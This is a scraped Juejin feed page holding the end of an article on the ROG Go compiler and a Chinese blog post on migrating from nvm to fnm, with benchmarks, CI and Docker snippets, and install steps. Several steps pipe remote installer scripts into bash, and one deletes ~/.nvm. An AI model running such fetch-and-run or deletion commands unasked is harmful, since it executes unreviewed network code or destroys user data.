<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b115927d8e564427a23e6b6ebabb573d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ2xvdWRXZUdv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943069&amp;x-signature=rzq3oKMr7qd1F77sGUAVNlmqklA%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-5">四、落地成效：CPU 显著下降，QPS 提升 10%+</h4>
<p>ROG 在实际业务场景中的应用取得了明显的性能提升。</p>
<ul>
<li>
<p><strong>计算密集型场景</strong> ：对于纯计算的多线程程序，用原生 Go 编译需要 12.99 秒，用 ROG 编译后，时间缩短到了 <strong>2.91 秒</strong> ，性能提升了 <strong>346%</strong>。</p>
</li>
<li>
<p><strong>微服务框架场景</strong> ：在 Kitex 框架的性能测试中，用 ROG 编译的版本和原生 Go 相比，每秒请求数从 330051 提高到了 <strong>364808</strong> ，提升了 <strong>10.5%</strong>。</p>
</li>
<li>
<p><strong>线上业务表现</strong>：</p>
<ul>
<li>
<p>服务 A：平均 CPU 使用率从 54.5% 降到了 <strong>45%</strong> ，降低了 <strong>9.5%</strong>。</p>
</li>
<li>
<p>服务 B：平均 CPU 使用率从 36% 降到了 <strong>22%</strong> ，降低了 <strong>14%</strong>。</p>
</li>
</ul>
</li>
</ul>
<p>更重要的是，由于 ROG 的运行环境是用 Rust 开发的，天生就支持 <strong>Go 和 Rust 的混合编译和链接</strong>。这意味着开发者可以直接在 Go 代码中调用高性能的 Rust 或 C 函数，不用再通过 CGo 进行复杂的封装，为业务的进一步优化提供了新的可能。</p>
<h4 data-id="heading-6">五、未来展望：迈向更深度的跨语言融合</h4>
<p>目前，ROG 已经证明了它在性能优化方面的价值，但这只是个开端。服务框架团队的目标不仅仅是让 Go 代码运行得更快，还希望探索两种语言生态的深度融合；理想情况下，希望未来的 ROG 不只是一个编译器，还能成为连接 Go 和 Rust 的桥梁。</p>
<p>未来，会重点支持 LLVM 的更多高级优化功能，比如 PGO 和 LTO，进一步挖掘性能潜力，同时也会不断优化 ROG 的运行环境，尝试在更多核心业务场景中应用，为开发者提供一个无缝、高效的跨语言开发体验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 nvm 到 fnm：一个前端老兵的版本管理工具迁移实录]]></title>    <link>https://juejin.cn/post/7581779319572873254</link>    <guid>https://juejin.cn/post/7581779319572873254</guid>    <pubDate>2025-12-10T03:54:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581779319572873254" data-draft-id="7581751726506049579" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 nvm 到 fnm：一个前端老兵的版本管理工具迁移实录"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-10T03:54:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="若尘的技术之旅"/> <meta itemprop="url" content="https://juejin.cn/user/2700056286215032"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 nvm 到 fnm：一个前端老兵的版本管理工具迁移实录
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2700056286215032/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    若尘的技术之旅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T03:54:20.000Z" title="Wed Dec 10 2025 03:54:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从 nvm 到 fnm：一个前端老兵的版本管理工具迁移实录</h2>
<h3 data-id="heading-1">引子：那个让我崩溃的早晨</h3>
<p>某个周一早晨，我像往常一样打开终端准备开始工作。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 打开 iTerm2... 等待... 等待...</span>
<span class="hljs-comment"># 终于出现命令提示符，耗时 2.3 秒</span>
</code></pre>
<p>接着切换到一个需要 Node 16 的老项目：</p>
<pre><code class="hljs language-bash" lang="bash">$ nvm use 16
Now using node v16.20.2 (npm v8.19.4)
<span class="hljs-comment"># 又是 0.5 秒过去了</span>
</code></pre>
<p>然后跳到另一个 Node 20 的新项目：</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> ../new-project
$ nvm use 20
Now using node v20.19.6 (npm v10.8.2)
<span class="hljs-comment"># 再等 0.5 秒</span>
</code></pre>
<p>一天下来，在 5-6 个项目间来回切换，光是等 nvm 响应就浪费了不知道多少时间。更别提有时候忘记 <code>nvm use</code>，直接 <code>npm install</code> 导致 node_modules 版本混乱的惨剧了。</p>
<p><strong>是时候做出改变了。</strong></p>
<h3 data-id="heading-2">为什么要离开 nvm？</h3>
<h4 data-id="heading-3">痛点一：Shell 启动慢得令人发指</h4>
<p>nvm 是纯 Bash 脚本实现的。每次打开新终端，它都要：</p>
<ol>
<li>加载 <code>nvm.sh</code> 脚本（几千行）</li>
<li>解析已安装的 Node 版本</li>
<li>设置环境变量</li>
<li>初始化自动补全</li>
</ol>
<p>我用 <code>time</code> 测了一下我的 <code>.zshrc</code> 加载时间：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 有 nvm</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
zsh -i -c <span class="hljs-built_in">exit</span>  0.42s user 0.23s system 95% cpu 0.678 total

<span class="hljs-comment"># 注释掉 nvm 后</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
zsh -i -c <span class="hljs-built_in">exit</span>  0.08s user 0.05s system 92% cpu 0.142 total
</code></pre>
<p><strong>nvm 让我的终端启动慢了近 5 倍！</strong></p>
<h4 data-id="heading-4">痛点二：版本切换不够智能</h4>
<p>每次进入不同项目都要手动 <code>nvm use</code>，太原始了。虽然有 <code>avn</code>、<code>nvm-auto</code> 等插件可以实现自动切换，但：</p>
<ul>
<li>又增加了一层依赖</li>
<li>又拖慢了 Shell 速度</li>
<li>配置起来也挺麻烦</li>
</ul>
<h4 data-id="heading-5">痛点三：Windows 支持是个笑话</h4>
<p>nvm 官方根本不支持 Windows。<code>nvm-windows</code> 是另一个独立项目，命令和行为都有差异。团队里用 Windows 的同事经常遇到各种奇怪问题。</p>
<h4 data-id="heading-6">痛点四：偶发的诡异 Bug</h4>
<p>用了几年 nvm，遇到过各种奇怪问题：</p>
<ul>
<li>全局安装的包莫名消失</li>
<li><code>npm prefix</code> 路径错乱</li>
<li>多个终端窗口版本不同步</li>
<li><code>.nvmrc</code> 有时候不生效</li>
</ul>
<h3 data-id="heading-7">遇见 fnm：Rust 带来的性能革命</h3>
<p>fnm（Fast Node Manager）是用 Rust 写的 Node.js 版本管理器。第一次用的时候，我的反应是：</p>
<blockquote>
<p>"就这？结束了？怎么这么快？"</p>
</blockquote>
<h4 data-id="heading-8">性能实测对比</h4>
<p>我在自己的 M1 MacBook Pro 上做了详细测试：</p>
<h5 data-id="heading-9">终端启动时间</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># nvm</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
0.678 total

<span class="hljs-comment"># fnm</span>
$ time zsh -i -c <span class="hljs-built_in">exit</span>
0.089 total

<span class="hljs-comment"># 提升：7.6 倍</span>
</code></pre>
<h5 data-id="heading-10">版本切换时间</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># nvm</span>
$ time nvm use 20
Now using node v20.19.6
real    0m0.347s

<span class="hljs-comment"># fnm</span>
$ time fnm use 20
Using Node v20.19.6
real    0m0.012s

<span class="hljs-comment"># 提升：29 倍</span>
</code></pre>
<h5 data-id="heading-11">安装新版本</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># nvm install 22</span>
<span class="hljs-comment"># 总耗时约 45 秒（包含下载）</span>

<span class="hljs-comment"># fnm install 22</span>
<span class="hljs-comment"># 总耗时约 38 秒（包含下载）</span>

<span class="hljs-comment"># 下载速度差不多，但 fnm 的解压和配置更快</span>
</code></pre>
<h4 data-id="heading-12">为什么 fnm 这么快？</h4>
<ol>
<li><strong>原生二进制</strong>：Rust 编译成机器码，不需要解释器</li>
<li><strong>并行处理</strong>：充分利用多核 CPU</li>
<li><strong>惰性加载</strong>：只在需要时才读取版本信息</li>
<li><strong>高效的文件操作</strong>：Rust 的 I/O 性能本就出色</li>
</ol>
<h3 data-id="heading-13">真实场景：fnm 如何改变我的工作流</h3>
<h4 data-id="heading-14">场景一：多项目并行开发</h4>
<p>我同时维护着这些项目：</p>



































<table><thead><tr><th>项目</th><th>Node 版本</th><th>原因</th></tr></thead><tbody><tr><td>老后台系统</td><td>14</td><td>历史包袱，依赖不支持高版本</td></tr><tr><td>主站前端</td><td>18</td><td>稳定的 LTS</td></tr><tr><td>新管理后台</td><td>20</td><td>需要新特性</td></tr><tr><td>实验性项目</td><td>22</td><td>尝鲜最新 API</td></tr><tr><td>Electron 应用</td><td>18</td><td>Electron 版本限制</td></tr></tbody></table>
<p><strong>以前用 nvm：</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> legacy-admin
$ nvm use  <span class="hljs-comment"># 等待...</span>
Found <span class="hljs-string">'/Users/me/legacy-admin/.nvmrc'</span> with version &lt;14&gt;
Now using node v14.21.3

$ <span class="hljs-built_in">cd</span> ../main-site
$ nvm use  <span class="hljs-comment"># 又等待...</span>
Found <span class="hljs-string">'/Users/me/main-site/.nvmrc'</span> with version &lt;18&gt;
Now using node v18.20.8

<span class="hljs-comment"># 经常忘记 nvm use，然后...</span>
$ npm install
<span class="hljs-comment"># 装了一堆错误版本的依赖 💥</span>
</code></pre>
<p><strong>现在用 fnm：</strong></p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> legacy-admin
Using Node v14.21.3  <span class="hljs-comment"># 自动切换，瞬间完成</span>

$ <span class="hljs-built_in">cd</span> ../main-site
Using Node v20.19.6  <span class="hljs-comment"># 无感切换</span>

<span class="hljs-comment"># 永远不会忘记切换版本，因为是自动的</span>
</code></pre>
<h4 data-id="heading-15">场景二：CI/CD 环境统一</h4>
<p>我们团队的 CI 配置以前是这样的：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .gitlab-ci.yml (使用 nvm)</span>
<span class="hljs-attr">before_script:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">curl</span> <span class="hljs-string">-o-</span> <span class="hljs-string">https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh</span> <span class="hljs-string">|</span> <span class="hljs-string">bash</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">export</span> <span class="hljs-string">NVM_DIR="$HOME/.nvm"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">.</span> <span class="hljs-string">"$NVM_DIR/nvm.sh"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">nvm</span> <span class="hljs-string">install</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">nvm</span> <span class="hljs-string">use</span>
</code></pre>
<p>换成 fnm 后：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># .gitlab-ci.yml (使用 fnm)</span>
<span class="hljs-attr">before_script:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">curl</span> <span class="hljs-string">-fsSL</span> <span class="hljs-string">https://fnm.vercel.app/install</span> <span class="hljs-string">|</span> <span class="hljs-string">bash</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">eval</span> <span class="hljs-string">"$(fnm env)"</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">fnm</span> <span class="hljs-string">install</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">fnm</span> <span class="hljs-string">use</span>
</code></pre>
<p><strong>CI 构建时间减少了约 15 秒</strong>（主要是 nvm 初始化太慢）。</p>
<h4 data-id="heading-16">场景三：团队协作与跨平台</h4>
<p>我们团队成员使用的系统：</p>
<ul>
<li>60% macOS</li>
<li>30% Windows</li>
<li>10% Linux</li>
</ul>
<p><strong>nvm 时代的痛苦：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># macOS/Linux 同事</span>
$ nvm use 20

<span class="hljs-comment"># Windows 同事（nvm-windows）</span>
$ nvm use 20.19.6  <span class="hljs-comment"># 必须写完整版本号！</span>
<span class="hljs-comment"># 而且 .nvmrc 经常不生效</span>
</code></pre>
<p><strong>fnm 时代的统一：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 所有平台，相同命令，相同行为</span>
$ fnm use 20
</code></pre>
<p>Windows 同事终于不用单独维护一套文档了。</p>
<h4 data-id="heading-17">场景四：Docker 开发环境</h4>
<p>在 Dockerfile 中安装 Node：</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile"># 以前用 nvm（不推荐，但有人这么干）
RUN curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash \
    &amp;&amp; . ~/.nvm/nvm.sh \
    &amp;&amp; nvm install 20 \
    &amp;&amp; nvm alias default 20
# 镜像体积大，层数多

# 现在用 fnm
RUN curl -fsSL https://fnm.vercel.app/install | bash -s -- --install-dir /usr/local/bin \
    &amp;&amp; fnm install 20 \
    &amp;&amp; fnm default 20
# 更简洁，体积更小
</code></pre>
<h4 data-id="heading-18">场景五：Monorepo 中的多版本需求</h4>
<p>我们有一个 Monorepo，不同 package 需要不同 Node 版本：</p>
<pre><code class="hljs language-bash" lang="bash">monorepo/
├── packages/
│   ├── legacy-sdk/        <span class="hljs-comment"># 需要 Node 14（兼容老用户）</span>
│   │   └── .node-version  <span class="hljs-comment"># 14</span>
│   ├── web-app/           <span class="hljs-comment"># 需要 Node 20</span>
│   │   └── .node-version  <span class="hljs-comment"># 20</span>
│   └── cli-tool/          <span class="hljs-comment"># 需要 Node 18</span>
│       └── .node-version  <span class="hljs-comment"># 18</span>
└── .node-version          <span class="hljs-comment"># 20（默认）</span>
</code></pre>
<p>fnm 的 <code>--use-on-cd</code> 让我在不同 package 间跳转时完全无感：</p>
<pre><code class="hljs language-bash" lang="bash">$ <span class="hljs-built_in">cd</span> packages/legacy-sdk
Using Node v14.21.3

$ <span class="hljs-built_in">cd</span> ../web-app
Using Node v20.19.6

$ <span class="hljs-built_in">cd</span> ../cli-tool
Using Node v18.20.8
</code></pre>
<h3 data-id="heading-19">完整迁移指南</h3>
<h4 data-id="heading-20">第一步：安装 fnm</h4>
<p><strong>macOS (Homebrew):</strong></p>
<pre><code class="hljs language-bash" lang="bash">brew install fnm
</code></pre>
<p><strong>Windows (Scoop):</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">scoop install fnm
</code></pre>
<p><strong>Windows (Chocolatey):</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">choco install fnm
</code></pre>
<p><strong>Linux/macOS (curl):</strong></p>
<pre><code class="hljs language-bash" lang="bash">curl -fsSL https://fnm.vercel.app/install | bash
</code></pre>
<p><strong>Cargo (Rust 用户):</strong></p>
<pre><code class="hljs language-bash" lang="bash">cargo install fnm
</code></pre>
<h4 data-id="heading-21">第二步：配置 Shell</h4>
<p>这是最关键的一步，配置正确才能享受自动切换的便利。</p>
<p><strong>Zsh (~/.zshrc):</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># fnm - Fast Node Manager</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --shell zsh)</span>"</span>
</code></pre>
<p><strong>Bash (~/.bashrc):</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># fnm - Fast Node Manager</span>
<span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --shell bash)</span>"</span>
</code></pre>
<p><strong>Fish (~/.config/fish/config.fish):</strong></p>
<pre><code class="hljs language-fish" lang="fish"># fnm - Fast Node Manager
fnm env --use-on-cd --shell fish | source
</code></pre>
<p><strong>PowerShell ($PROFILE):</strong></p>
<pre><code class="hljs language-powershell" lang="powershell"># fnm - Fast Node Manager
fnm env --use-on-cd --shell powershell | Out-String | Invoke-Expression
</code></pre>
<p><strong>参数说明：</strong></p>

























<table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td><code>--use-on-cd</code></td><td>进入目录时自动读取 <code>.node-version</code> 或 <code>.nvmrc</code> 并切换</td></tr><tr><td><code>--shell &lt;shell&gt;</code></td><td>指定 Shell 类型，生成对应的环境变量设置命令</td></tr><tr><td><code>--version-file-strategy recursive</code></td><td>向上递归查找版本文件（可选）</td></tr><tr><td><code>--corepack-enabled</code></td><td>自动启用 Corepack（可选）</td></tr></tbody></table>
<h4 data-id="heading-22">第三步：迁移已安装的 Node 版本</h4>
<p>查看 nvm 安装了哪些版本：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">ls</span> ~/.nvm/versions/node/
<span class="hljs-comment"># v10.24.1 v14.21.3 v16.20.2 v18.20.8 v20.19.6 v22.21.0</span>
</code></pre>
<p>在 fnm 中安装对应版本：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方式一：通过 LTS 代号安装（推荐，自动获取最新补丁版本）</span>
fnm install lts/fermium   <span class="hljs-comment"># v14.x</span>
fnm install lts/gallium   <span class="hljs-comment"># v16.x</span>
fnm install lts/hydrogen  <span class="hljs-comment"># v18.x</span>
fnm install lts/iron      <span class="hljs-comment"># v20.x</span>
fnm install lts/jod       <span class="hljs-comment"># v22.x</span>

<span class="hljs-comment"># 方式二：通过大版本号安装</span>
fnm install 14
fnm install 16
fnm install 18
fnm install 20
fnm install 22

<span class="hljs-comment"># 方式三：安装精确版本</span>
fnm install 18.20.8
fnm install 20.19.6
</code></pre>
<p>设置默认版本：</p>
<pre><code class="hljs language-bash" lang="bash">fnm default 22
</code></pre>
<h4 data-id="heading-23">第四步：处理全局 npm 包</h4>
<p>这是很多人忽略的一步！nvm 下安装的全局包不会自动迁移。</p>
<p>查看 nvm 中的全局包：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 切换到 nvm 的某个版本</span>
<span class="hljs-built_in">export</span> PATH=<span class="hljs-string">"<span class="hljs-variable">$HOME</span>/.nvm/versions/node/v20.19.6/bin:<span class="hljs-variable">$PATH</span>"</span>
npm list -g --depth=0
</code></pre>
<p>在 fnm 的对应版本中重新安装：</p>
<pre><code class="hljs language-bash" lang="bash">fnm use 20
npm install -g typescript ts-node nodemon pm2 <span class="hljs-comment"># 你需要的包</span>
</code></pre>
<p><strong>Pro Tip:</strong> 可以写个脚本批量处理：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># migrate-global-packages.sh</span>

<span class="hljs-comment"># 你常用的全局包</span>
PACKAGES=<span class="hljs-string">"typescript ts-node nodemon pm2 pnpm yarn"</span>

<span class="hljs-keyword">for</span> version <span class="hljs-keyword">in</span> 18 20 22; <span class="hljs-keyword">do</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"Installing global packages for Node <span class="hljs-variable">$version</span>..."</span>
  fnm use <span class="hljs-variable">$version</span>
  npm install -g <span class="hljs-variable">$PACKAGES</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h4 data-id="heading-24">第五步：注释掉 nvm 配置</h4>
<p>编辑你的 Shell 配置文件：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ~/.zshrc 或 ~/.bashrc</span>

<span class="hljs-comment"># nvm - 已迁移到 fnm，注释掉避免冲突</span>
<span class="hljs-comment"># export NVM_DIR="$HOME/.nvm"</span>
<span class="hljs-comment"># [ -s "$NVM_DIR/nvm.sh" ] &amp;&amp; \. "$NVM_DIR/nvm.sh"</span>
<span class="hljs-comment"># [ -s "$NVM_DIR/bash_completion" ] &amp;&amp; \. "$NVM_DIR/bash_completion"</span>
</code></pre>
<h4 data-id="heading-25">第六步：验证迁移结果</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 重新加载配置</span>
<span class="hljs-built_in">source</span> ~/.zshrc  <span class="hljs-comment"># 或 source ~/.bashrc</span>

<span class="hljs-comment"># 验证 fnm 工作正常</span>
fnm list
fnm current
node -v
npm -v
<span class="hljs-built_in">which</span> node

<span class="hljs-comment"># 测试自动切换</span>
<span class="hljs-built_in">cd</span> /path/to/project-with-nvmrc
<span class="hljs-comment"># 应该看到 "Using Node vX.X.X"</span>
node -v
</code></pre>
<h4 data-id="heading-26">第七步：删除 nvm（可选但推荐）</h4>
<p>确认一切正常后，可以删除 nvm 释放磁盘空间：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span> -rf ~/.nvm

<span class="hljs-comment"># 如果遇到权限问题</span>
sudo <span class="hljs-built_in">rm</span> -rf ~/.nvm
</code></pre>
<h3 data-id="heading-27">命令速查表</h3>




























































<table><thead><tr><th>功能</th><th>nvm 命令</th><th>fnm 命令</th></tr></thead><tbody><tr><td>安装指定版本</td><td><code>nvm install 20</code></td><td><code>fnm install 20</code></td></tr><tr><td>安装最新 LTS</td><td><code>nvm install --lts</code></td><td><code>fnm install --lts</code></td></tr><tr><td>安装指定 LTS</td><td><code>nvm install --lts=iron</code></td><td><code>fnm install lts/iron</code></td></tr><tr><td>切换版本</td><td><code>nvm use 20</code></td><td><code>fnm use 20</code></td></tr><tr><td>设置默认版本</td><td><code>nvm alias default 20</code></td><td><code>fnm default 20</code></td></tr><tr><td>查看已安装版本</td><td><code>nvm ls</code></td><td><code>fnm list</code></td></tr><tr><td>查看远程可用版本</td><td><code>nvm ls-remote</code></td><td><code>fnm list-remote</code></td></tr><tr><td>查看当前版本</td><td><code>nvm current</code></td><td><code>fnm current</code></td></tr><tr><td>卸载版本</td><td><code>nvm uninstall 18</code></td><td><code>fnm uninstall 18</code></td></tr><tr><td>在指定版本执行命令</td><td><code>nvm exec 18 node -v</code></td><td><code>fnm exec --using=18 node -v</code></td></tr></tbody></table>
<h3 data-id="heading-28">LTS 版本代号参考</h3>





















































<table><thead><tr><th>代号</th><th>版本</th><th>发布日期</th><th>LTS 开始</th><th>维护结束</th><th>状态</th></tr></thead><tbody><tr><td>Jod</td><td>v22.x</td><td>2024-04</td><td>2024-10</td><td>2027-04</td><td>✅ Active LTS</td></tr><tr><td>Iron</td><td>v20.x</td><td>2023-04</td><td>2023-10</td><td>2026-04</td><td>✅ Active LTS</td></tr><tr><td>Hydrogen</td><td>v18.x</td><td>2022-04</td><td>2022-10</td><td>2025-04</td><td>⚠️ Maintenance</td></tr><tr><td>Gallium</td><td>v16.x</td><td>2021-04</td><td>2021-10</td><td>2024-09</td><td>❌ End-of-Life</td></tr><tr><td>Fermium</td><td>v14.x</td><td>2020-04</td><td>2020-10</td><td>2023-04</td><td>❌ End-of-Life</td></tr></tbody></table>
<blockquote>
<p><strong>建议</strong>：新项目使用 v20 或 v22，老项目尽快升级到至少 v18。</p>
</blockquote>
<h3 data-id="heading-29">进阶技巧</h3>
<h4 data-id="heading-30">1. 配置版本文件查找策略</h4>
<p>默认情况下，fnm 只在当前目录查找 <code>.node-version</code> 或 <code>.nvmrc</code>。如果你的项目结构比较深，可以启用递归查找：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">eval</span> <span class="hljs-string">"<span class="hljs-subst">$(fnm env --use-on-cd --version-file-strategy recursive)</span>"</span>
</code></pre>
<h4 data-id="heading-31">2. 启用 Corepack</h4>
<p>Corepack 是 Node.js 内置的包管理器版本管理工具，可以锁定 pnpm/yarn 版本：</p>
